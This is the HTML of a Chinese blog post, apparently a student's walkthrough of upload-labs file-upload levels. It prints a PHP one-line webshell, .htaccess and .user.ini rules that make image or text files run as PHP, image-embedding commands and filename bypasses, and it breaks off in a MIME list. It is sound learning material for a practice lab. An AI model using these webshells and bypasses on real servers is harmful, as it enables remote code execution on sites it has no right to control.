@@ -1,0 +1,384 @@
+<!DOCTYPE html><html lang="ch" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传学习1 | cyan5s's blog</title><meta name="author" content="cyan5s"><meta name="copyright" content="cyan5s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="upload-labs蚁剑下载 第一关上传了一个木马文件1.php 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;  就这么水灵灵的让我上传成功了 执行命令的原理是，给cmd赋值为要执行的命令。那么如果没有蚁剑，依然可以命令执行： 在上传的文件的url下POST传参cmd&#x3D;phpinfo();  当然，如果有蚁剑，连接后即可获得整个服务器  第二关仍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传学习1">
+<meta property="og:url" content="http://cyan5s.github.io/2025/09/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A01/index.html">
+<meta property="og:site_name" content="cyan5s&#39;s blog">
+<meta property="og:description" content="upload-labs蚁剑下载 第一关上传了一个木马文件1.php 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;  就这么水灵灵的让我上传成功了 执行命令的原理是，给cmd赋值为要执行的命令。那么如果没有蚁剑，依然可以命令执行： 在上传的文件的url下POST传参cmd&#x3D;phpinfo();  当然，如果有蚁剑，连接后即可获得整个服务器  第二关仍">
+<meta property="og:locale">
+<meta property="og:image" content="http://cyan5s.github.io/img/cyan5s.jpg">
+<meta property="article:published_time" content="2025-09-28T11:31:12.000Z">
+<meta property="article:modified_time" content="2025-11-22T04:42:59.408Z">
+<meta property="article:author" content="cyan5s">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cyan5s.github.io/img/cyan5s.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件上传学习1",
+  "url": "http://cyan5s.github.io/2025/09/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A01/",
+  "image": "http://cyan5s.github.io/img/cyan5s.jpg",
+  "datePublished": "2025-09-28T11:31:12.000Z",
+  "dateModified": "2025-11-22T04:42:59.408Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cyan5s",
+      "url": "http://cyan5s.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://cyan5s.github.io/2025/09/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传学习1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">cyan5s's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">文件上传学习1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">文件上传学习1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-28T11:31:12.000Z" title="Created 2025-09-28 19:31:12">2025-09-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-22T04:42:59.408Z" title="Updated 2025-11-22 12:42:59">2025-11-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>蚁剑下载</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>上传了一个木马文件1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就这么水灵灵的让我上传成功了</p>
+<p>执行命令的原理是，给<code>cmd</code>赋值为要执行的命令。那么如果没有蚁剑，依然可以命令执行：</p>
+<p>在上传的文件的url下POST传参<code>cmd=phpinfo();</code></p>
+<p><img src="https://free.picui.cn/free/2025/11/22/69213e3b62046.png" alt="image-20250927184744984.png"></p>
+<p>当然，如果有蚁剑，连接后即可获得整个服务器</p>
+<p><img src="https://free.picui.cn/free/2025/11/22/69213e8d8bdc1.png" alt="1763786428217.png"></p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>仍然先尝试1.php，失败；上传正常.jpg图片文件成功。</p>
+<p>尝试把1.php改成1.jpg，上传成功，但木马无法执行（木马文件没有按照php的规则来解析）。</p>
+<p>仍选择假图片1.jpg，在上传时抓包，改为1.php，放行，成功。</p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>尝试1.php，提示：**不允许上传.asp,.aspx,.php,.jsp后缀文件！**看起来像是黑名单</p>
+<p>查看源码</p>
+<p><img src="https://free.picui.cn/free/2025/11/22/69213eba0c5bb.png" alt="image-20250927203135023.png"></p>
+<h3 id="1-部分服务器可以将-php3，-php5，-phtml……解析成php文件。"><a href="#1-部分服务器可以将-php3，-php5，-phtml……解析成php文件。" class="headerlink" title="1.  部分服务器可以将.php3，.php5，.phtml……解析成php文件。"></a>1.  部分服务器可以将.php3，.php5，.phtml……解析成php文件。</h3><h4 id="TS"><a href="#TS" class="headerlink" title="TS"></a>TS</h4><p>在服务器端的设置：（Apache）</p>
+<p>“…\phpstudy_pro\Extensions\Apache2.4.39\conf\httpd.conf”</p>
+<p><img src="https://free.picui.cn/free/2025/11/22/69213ed219044.png" alt="image-20250927204229065.png"></p>
+<p>（一般默认不开启，若需要打靶场联系可手动开启）</p>
+<h4 id="NTS"><a href="#NTS" class="headerlink" title="NTS"></a>NTS</h4><h5 id="情况-1：Nginx-PHP-FPM"><a href="#情况-1：Nginx-PHP-FPM" class="headerlink" title="情况 1：Nginx + PHP-FPM"></a>情况 1：Nginx + PHP-FPM</h5><p>修改 <code>php-fpm.conf</code>或 <code>php.ini</code>或 <code>www.conf</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.limit_extensions = .php .php3 .phtml</span><br><span class="line">#如果没有配置，上传的 `.php3`文件会被当作普通文件下载，而不会执行 PHP 代码。</span><br></pre></td></tr></table></figure>
+
+<p>重启 PHP-FPM：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart php-fpm</span><br></pre></td></tr></table></figure>
+
+<h5 id="情况-2：Apache-PHP-FPM"><a href="#情况-2：Apache-PHP-FPM" class="headerlink" title="情况 2：Apache + PHP-FPM"></a>情况 2：Apache + PHP-FPM</h5><p>如果 Apache 使用 <code>ProxyPassMatch</code>或 <code>FastCGI</code>方式运行 PHP，也需要额外配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php3$&gt;</span><br><span class="line">    SetHandler &quot;proxy:fcgi://127.0.0.1:9000&quot;</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在 Nginx 的 <code>server</code>块中添加：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php3$ &#123;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-php版本分为nts（非线程安全）和ts（线程安全"><a href="#2-php版本分为nts（非线程安全）和ts（线程安全" class="headerlink" title="2. php版本分为nts（非线程安全）和ts（线程安全)"></a>2. php版本分为nts（非线程安全）和ts（线程安全)</h3><p>nts为单线程，ts为多线程</p>
+<ul>
+<li><strong>Apache + <code>mod_php</code>（TS）</strong>：可以直接在 Apache 配置中定义 <code>.php3</code>的解析规则（如 <code>AddType application/x-httpd-php .php .php3</code>）。</li>
+<li><strong>Nginx + PHP-FPM（NTS）</strong>：默认不会自动解析 <code>.php3</code>，除非手动配置 <code>fastcgi_split_path_info</code>或修改 <code>security.limit_extensions</code>。</li>
+</ul>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>如果说<code>httpd.conf</code>是Apache配置文件的老大，那么<code>.htaccess</code>就是每个目录下都可以存在的小弟。</p>
+<p>前提是大哥要给小弟晋升之路~将<code>AllowOverride</code>后都改成ALL</p>
+<p>先上传<code>.htaccess</code>，<strong>让 <code>.jpg</code>、<code>.txt</code>、<code>.png</code>文件被当作 PHP 解析</strong>。</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><ol>
+<li><h4 id="使用-AddType"><a href="#使用-AddType" class="headerlink" title="使用 AddType"></a>使用 AddType</h4><em>让 <code>.jpg</code>、<code>.txt</code>、<code>.png</code>文件被当作 PHP 解析。</em></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg .txt .png</span><br><span class="line">#适用于大多数 Apache 环境。</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><h4 id="使用-SetHandler"><a href="#使用-SetHandler" class="headerlink" title="使用 SetHandler"></a>使用 SetHandler</h4><em>匹配 <code>.jpg</code>、<code>.txt</code>、<code>.png</code>文件，并强制用 PHP 解析。</em></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(jpg|txt|png)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#可以结合正则表达式，更灵活地控制哪些文件被解析。</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><h4 id="使用-ForceType"><a href="#使用-ForceType" class="headerlink" title="使用 ForceType"></a>使用 ForceType</h4><em>强制让匹配的文件类型被当作 PHP 解析。</em></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(jpg|txt|png)$&quot;&gt;</span><br><span class="line">    ForceType application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#ForceType会覆盖 MIME 类型，而 SetHandler只是设置处理器。</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><h4 id="针对特定文件名"><a href="#针对特定文件名" class="headerlink" title="针对特定文件名"></a>针对特定文件名</h4></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;^shell\.|^webshell\.|^backdoor\.&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#让文件名包含 shell、webshell、backdoor的文件被当作 PHP 执行，无论扩展名是什么。</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><h4 id="匹配所有文件（慎用）"><a href="#匹配所有文件（慎用）" class="headerlink" title="匹配所有文件（慎用）"></a>匹配所有文件（慎用）</h4></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><h4 id="结合-mod-rewrite实现动态解析"><a href="#结合-mod-rewrite实现动态解析" class="headerlink" title="结合 mod_rewrite实现动态解析"></a>结合 mod_rewrite实现动态解析</h4><em>把 <code>.jpg</code>、<code>.txt</code>、<code>.png</code>文件的访问请求重定向到 PHP 脚本处理。</em></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule ^(.*\.(jpg|txt|png))$ /index.php?file=$1 [L]</span><br><span class="line">#适用于需要动态处理的场景，但不如 SetHandler直接。</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><h4 id="以上可合并"><a href="#以上可合并" class="headerlink" title="以上可合并"></a>以上可合并</h4></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 方法1：AddType</span><br><span class="line">AddType application/x-httpd-php .jpg .txt .png</span><br><span class="line"></span><br><span class="line"># 方法2：SetHandler</span><br><span class="line">&lt;FilesMatch &quot;\.(jpg|txt|png)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 方法3：ForceType</span><br><span class="line">&lt;FilesMatch &quot;\.(jpg|txt|png)$&quot;&gt;</span><br><span class="line">    ForceType application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 防止 .htaccess 被访问</span><br><span class="line">&lt;Files ~ &quot;^\.ht&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后再上传图片码</p>
+<h3 id="图片写码"><a href="#图片写码" class="headerlink" title="图片写码"></a>图片写码</h3><h4 id="直接改后缀"><a href="#直接改后缀" class="headerlink" title="直接改后缀"></a>直接改后缀</h4><p>1.php&#x3D;&gt;1.jpg</p>
+<p><em>（无法正常显示图片）</em></p>
+<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.php[木马]`；；`photo.jpg[正常图片]</span><br><span class="line">copy photo.jpg/b+1.php tpm.jpg//图片码能显示图片</span><br><span class="line">#或：</span><br><span class="line">copy photo.jpg/b+1.php tpm.jpg//图片码不能显示图片</span><br></pre></td></tr></table></figure>
+
+<p><code>tpm.jpg</code>即为生成的图片码</p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><h3 id="htaccess-httpd-conf-user-ini-php-ini"><a href="#htaccess-httpd-conf-user-ini-php-ini" class="headerlink" title=".htaccess &amp; httpd.conf &amp; .user.ini &amp; php.ini"></a>.<code>htaccess</code> &amp; <code>httpd.conf</code> &amp; <code>.user.ini</code> &amp; <code>php.ini</code></h3><table>
+<thead>
+<tr>
+<th align="left">特性</th>
+<th align="left"><code>.htaccess</code></th>
+<th align="left"><code>httpd.conf</code></th>
+<th align="left"><code>.user.ini</code></th>
+<th align="left"><code>php.ini</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>所属</strong></td>
+<td align="left"><strong>Web服务器 (Apache)</strong></td>
+<td align="left"><strong>Web服务器 (Apache)</strong></td>
+<td align="left"><strong>PHP</strong></td>
+<td align="left"><strong>PHP</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>层级</strong></td>
+<td align="left"><strong>目录级</strong> (分布式)</td>
+<td align="left"><strong>全局&#x2F;服务器级</strong> (主配置)</td>
+<td align="left"><strong>目录级</strong> (分布式)</td>
+<td align="left"><strong>全局&#x2F;服务器级</strong> (主配置)</td>
+</tr>
+<tr>
+<td align="left"><strong>主要功能</strong></td>
+<td align="left">覆盖Apache设置</td>
+<td align="left">定义Apache全局行为</td>
+<td align="left">覆盖PHP设置</td>
+<td align="left">定义PHP解释器全局行为</td>
+</tr>
+<tr>
+<td align="left"><strong>生效范围</strong></td>
+<td align="left">当前目录及其所有子目录。</td>
+<td align="left">整个Apache服务器或定义的虚拟主机。</td>
+<td align="left">当前目录及其所有子目录。</td>
+<td align="left">所有使用该PHP版本的网站&#x2F;脚本。</td>
+</tr>
+<tr>
+<td align="left"><strong>修改权限</strong></td>
+<td align="left">用户在目录中修改。</td>
+<td align="left">root</td>
+<td align="left">用户在目录中修改。</td>
+<td align="left">root</td>
+</tr>
+<tr>
+<td align="left"><strong>生效条件</strong></td>
+<td align="left"><strong>立即生效</strong></td>
+<td align="left">重启</td>
+<td align="left">有<strong>延迟</strong>。修改后需等待 <code>user_ini.cache_ttl</code>设置的时间（默认300秒）或重启PHP进程</td>
+<td align="left">重启</td>
+</tr>
+<tr>
+<td align="left"><strong>覆盖范围</strong></td>
+<td align="left">小地方称王</td>
+<td align="left">全局</td>
+<td align="left">小地方称王</td>
+<td align="left">全局</td>
+</tr>
+<tr>
+<td align="left"><strong>上传成功</strong></td>
+<td align="left">直接上传</td>
+<td align="left">-</td>
+<td align="left"><strong>需要上传的目录下有.php文件</strong></td>
+<td align="left">-</td>
+</tr>
+</tbody></table>
+<p>先上传.user.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Auto-prepend-file=1.txt</span><br></pre></td></tr></table></figure>
+
+<p>再上传1.txt，内容全为php代码（一句话木马）</p>
+<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>若上传的文件的目录下有php文件，才可上传成功。</p>
+<p><code>Auto-prepend-file=1.txt</code>的意思是将1.txt的内容包含在原来目录下的php文件里，一起执行php代码。</p>
+<p>故上传成功后要访问的路径是原本的php文件的路径。</p>
+<h3 id="点空格点"><a href="#点空格点" class="headerlink" title="点空格点"></a>点空格点</h3><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);//黑名单过滤</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);//识别最后一个.后面的内容为后缀</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;//上传的文件的路径为：上传文件夹/文件名</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假设上传<code>1.php. .</code></p>
+<p>删除末尾的点：<code>1.php. </code></p>
+<p>识别后缀：<code>.+空格</code></p>
+<p>转换小写+去除字符串::$DATA+去除字符串::$DATA，得到文件名：<code>1.php.</code></p>
+<p>在Windows下，若在文件名末尾加上<code>.</code>，空格，均会被系统自动去除，故实际上传的文件名为<code>1.php</code>，连接的url也是1.php文件的位置</p>
+<h4 id="预防-绕过的方法"><a href="#预防-绕过的方法" class="headerlink" title="预防. .绕过的方法"></a>预防. .绕过的方法</h4><p>在Pass-3里，上传文件的路径拼接为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;  </span><br></pre></td></tr></table></figure>
+
+<p>上传文件夹&#x2F;时间戳+文件后缀</p>
+<p>若上传<code>1.php. .</code>，则访问路径为<code>……upload/时间戳.</code>，该文件无法被解析成php</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="如何判断是前端校验还是后端"><a href="#如何判断是前端校验还是后端" class="headerlink" title="如何判断是前端校验还是后端"></a>如何判断是前端校验还是后端</h3><p>上传不合规文件时抓包，能抓到上传的数据包则为后端，否则为前端</p>
+<h3 id="MIME（Content-Type）"><a href="#MIME（Content-Type）" class="headerlink" title="MIME（Content-Type）"></a>MIME（Content-Type）</h3><table>
+<thead>
+<tr>
+<th>text&#x2F;plain（纯文本）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>text&#x2F;html（HTML 文档）</td>
+</tr>
+<tr>
+<td>text&#x2F;javascript（js 代码）</td>
+</tr>
+<tr>
+<td>application&#x2F;xhtml+xml（XHTML 文档）</td>
+</tr>
+<tr>
+<td>image&#x2F;gif（GIF 图像）</td>
+</tr>
+<tr>
+<td>image&#x2F;jpeg（JPEG 图像）</td>
+</tr>
+<tr>
+<td>image&#x2F;png（PNG 图像）</td>
+</tr>
+<tr>
+<td>video&#x2F;mpeg（MPEG 劢画）</td>
+</tr>
+<tr>
+<td>application&#x2F;octet-stream（二迚制数据）</td>
+</tr>
+<tr>
+<td>application&#x2F;pdf（PDF 文档）</td>
+</tr>
+<tr>
+<td>application&#x2F;(编程语言) 该种语言的代码</td>
+</tr>
+<tr>
+<td>application&#x2F;msword（Microsoft Word 文件）</td>
+</tr>
